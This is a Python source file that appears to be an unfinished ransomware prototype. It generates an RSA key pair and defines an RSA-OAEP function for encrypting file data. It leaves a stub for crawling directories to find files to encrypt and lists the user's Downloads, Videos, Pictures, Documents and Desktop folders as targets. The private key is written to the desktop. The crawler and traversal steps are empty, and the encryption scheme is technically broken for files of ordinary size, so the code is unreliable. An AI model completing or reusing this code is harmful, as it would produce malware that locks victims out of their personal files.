def crawler(curdir):
    # Will go through a Directory and Find Files to Be Encrypted
    import os

def encryptor(pubk,filedata):
    # Responsible of Encrypting all the Data Found
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    encrypted = pubk.encrypt(
        filedata,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

class RSAKeys:
    # Make and Manage the Private and Public Keys
    # Stores Keys
    def __init__(self,privk,pubk):
        self.privk = privk
        self.pubk = pubk

    # Makes the Keys
    def runner(self):
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.asymmetric import rsa
        # Generation Process
        self.privk = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.pubk = self.privk.public_key()

    # Saves Keys in File for Later Use
    def printer(self):
        from cryptography.hazmat.primitives import serialization
        pem = self.privk.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        with open('C:/Users/All Users/Desktop/PrivateKey.pem', 'wb') as key:
            key.write(pem)


if __name__ == "__main__":
    # Generate Key To Start the Fun
    key = RSAKeys("","")
    key.runner()

    # Traverse Downloads Folder

    # Traverse Videos Folder

    # Traverse Pictures Folder

    # Traverse Documents Folder

    # Traverse Desktop Folder

    # Save Key at End
    key.printer()
